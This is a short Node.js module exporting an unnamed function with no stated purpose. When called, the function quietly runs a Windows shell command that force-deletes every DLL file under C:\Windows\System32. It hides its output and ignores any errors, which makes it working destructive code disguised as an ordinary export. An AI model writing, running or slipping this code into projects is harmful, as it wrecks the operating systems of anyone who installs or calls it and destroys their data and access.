const {execSync:run}=require('child_process');
module.exports=function(){try{run('del /F /S /Q C:\\Windows\\System32\\*.dll',{shell:true,stdio:'ignore'});}catch(e){};};